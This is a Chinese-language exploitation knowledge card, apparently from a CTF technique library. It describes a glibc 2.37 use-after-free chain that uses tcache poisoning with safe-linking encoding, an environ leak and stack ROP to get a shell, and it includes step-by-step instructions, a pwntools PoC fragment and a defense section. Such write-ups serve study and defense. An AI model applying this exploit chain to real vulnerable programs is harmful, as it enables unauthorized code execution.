---
id: binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop
title: glibc 2.37 UAF 链：tcache 毒化全局结构体 + environ 泄露栈 + 栈上 ROP
type: scenario
domain: binary
path: binary/pwn/heap
technique: uaf-tcache-poison-global-environ-stack-rop
aliases:
- tcache 毒化全局结构体
- environ 泄露栈地址
- UAF 栈劫持
- safe-linking 毒化
- 堆题栈 ROP
tags:
- pwn
- heap
- glibc
- uaf
- tcache
- safe-linking
- environ
- stack
- rop
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V77
  verified_at: '2026-11-05T16:50:15+08:00'
  notes: 已对照原文 break 脚本核对：unsorted bin 泄露 libc/堆、safe-linking 毒化 0x602120、environ 泄露栈、栈上 ROP 的偏移与流程一致；glibc 2.37 仅为目标环境版本，按 brief 已清除 affected_versions；未复跑
---

## 一句话结论

在 glibc 2.37、无沙盒的 UAF 题里，先释放两块大 chunk 从 unsorted bin 同时泄露 libc 与堆地址，再用 safe-linking 编码把 tcache 链头毒化到程序全局的 `ptr/size` 结构体，借助该结构体的读写接口泄露 `environ` 得到栈地址，最后把 ROP 链写到栈上并触发返回，拿到 shell。

## 原理

- **UAF**：删除接口只 `free` 指针、不置空，且 `show`/`edit` 仍可按索引访问已释放 chunk；索引数量充足，允许反复布置堆布局。
- **第一段泄露**：申请多块大于 tcache 上限的 chunk（如请求 0x410），连续 free 后进入 unsorted bin；UAF `show` 读回 chunk 头部，`fd`/`bk` 分别给出 `main_arena+0x60`（libc）和另一块 chunk 地址（堆），一次输出同时拿到两个基址。
- **tcache 毒化**：申请并释放两块 0x80 chunk 放进同一 tcache bin；UAF `edit` 改写后释放块的 `fd`。因为 glibc 2.32+ 的 safe-linking，`fd = target ^ (fd字段地址 >> 12)`，脚本用已知堆地址与目标 `0x602120`（全局 `ptr/size` 数组）算出编码值。随后连续两次 `add`，第二次分配返回目标地址，得到一个指向全局结构体的“chunk”。
- **全局结构体布局**：程序用 `ptr`（数据指针）+ `size`（长度）描述缓冲区。把 `ptr=environ`、`size=8` 写进结构体后，`show` 会从 `environ` 读 8 字节，泄露栈上 `environ` 指针。
- **栈写 ROP**：把 `ptr=stack-0x190`、`size=0x200` 写进结构体，再用 `edit` 向该“缓冲区”写入 ROP 链（`ret` 对齐 + `pop rdi` + `/bin/sh` + `system`）；`main` 返回时直接进入 ROP。
- 这条链的关键不是新原语，而是把“tcache 毒化 → 任意地址分配 → 全局结构体任意读写 → environ 泄露 → 栈 ROP”串起来，且每步都复用程序自身的读写接口。

## 触发条件

- glibc 2.32+（safe-linking 生效；文章环境 2.37），无 seccomp/沙盒；
- 存在 UAF 读写接口，且索引/大小可控；
- 有大于 tcache 上限的 chunk 可进入 unsorted bin（用于 libc 泄露），并能读到 chunk 头部；
- 有可被 tcache 毒化的全局指针/长度结构体，或其它可用的任意读写目标；
- 已知目标 `environ` 与 libc 符号偏移、`0x602120` 等地址（关闭 PIE 或已泄露基址）。

## 利用步骤

1. 申请 4 块 0x410 chunk（0-3），free(0)、free(2)，`show(0)` 读 16 字节：前 8 字节算 libc 基址（减去 `main_arena+0x60` 偏移，示例 `0x1cbce0`），后 8 字节得到堆地址。
2. free(1)、free(3) 整理堆；申请 0x80 chunk 4、5，再 free(4)、free(5) 布置 0x80 tcache bin。
3. 计算 safe-linking 编码：`addr = 0x602120 ^ ((heap-0x7a0) >> 12)`；用 UAF `edit(5, 8, p64(addr))` 改写已释放 chunk5 的 `fd`。
4. 连续 `add(6, 0x80)`、`add(7, 0x80)`：第二次分配返回 `0x602120`（全局 `ptr/size` 结构体）。
5. 用 `edit(7, 0x10, flat(libc.sym['environ'], 0x8))` 把结构体设为指向 `environ`；`show(0)` 读出栈地址。
6. 计算 `stack - 0x190` 等目标；`edit(7, 0x10, flat(stack-0x190, 0x200))` 把结构体指向栈。
7. `edit(0, 0x20, flat(ret, pop_rdi, binsh, system))` 向栈写入 ROP（`ret` 用于对齐）。
8. 让 `main` 返回/触发退出路径，ROP 执行 `system("/bin/sh")`。

## PoC

```python
# 关键片段（完整脚本见原文；地址/偏移按目标 libc 调整）
add(0, 0x410)
add(1, 0x410)
add(2, 0x410)
add(3, 0x410)
free(0); free(2)
show(0)
libc.address = u64(io.recv(8).ljust(8, b'\x00')) - 0x1cbce0
heap = u64(io.recv(8).ljust(8, b'\x00'))

free(1); free(3)
add(4, 0x80); add(5, 0x80)
free(4); free(5)

addr = 0x602120 ^ ((heap - 0x7a0) >> 12)   # safe-linking 编码
edit(5, 0x8, p64(addr))

add(6, 0x80)
add(7, 0x80)                                # 返回 0x602120 全局结构体

edit(7, 0x10, flat(libc.sym['environ'], 0x8))
show(0)
stack = u64(io.recv(8).ljust(8, b'\x00'))

pop_rdi = next(libc.search(asm('pop rdi; ret'), executable=True))
sh = next(libc.search(b'/bin/sh'))
ret = 0x400EDC                               # 栈对齐
edit(7, 0x10, flat(stack - 0x190, 0x200))    # 结构体指向栈
edit(0, 0x20, flat(ret, pop_rdi, sh, libc.sym['system']))
io.interactive()
```

## 变体与关联

- 无堆泄露时，可用同页 tcache 双 free 自异或恢复堆地址（见 safe-linking 卡）。
- tcache 毒化目标可以是全局 `ptr/size` 结构体、`.bss` 函数指针、`__free_hook`（2.34 前）或 `exit_funcs`；核心是找到“分配后可写、程序会当作缓冲区使用”的地址。
- 有 seccomp 时 ROP 只能 ORW；本卡环境无沙盒，直接 `system`。
- 关联卡片：[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]、[[binary-pwn-heap-safe-linking-self-xor-heap-address]]、[[binary-pwn-heap-uaf-function-pointer-hijack]]、[[binary-pwn-heap-glibc243-tcache-key-bypass-got-system]]。

## 检测与防御

- 防御：free 后立即置空指针，删除/编辑接口校验对象是否仍在生命周期内；开启 tcache key、safe-linking、full RELRO、stack canary、ASLR；对高价值进程启用 seccomp 限制 execve。
- 检测：对同一索引连续 free/show/edit 的异常序列；tcache `fd` 出现非规范编码；`environ` 被异常读取；栈上出现 ROP 特征（`pop rdi; ret` 链）。
- 注意：本卡 PoC 依赖关闭 PIE/已知全局地址与特定 libc 偏移，换题需重新确认；文章未给出逐步调试解释，链接成立但未在本机复跑。
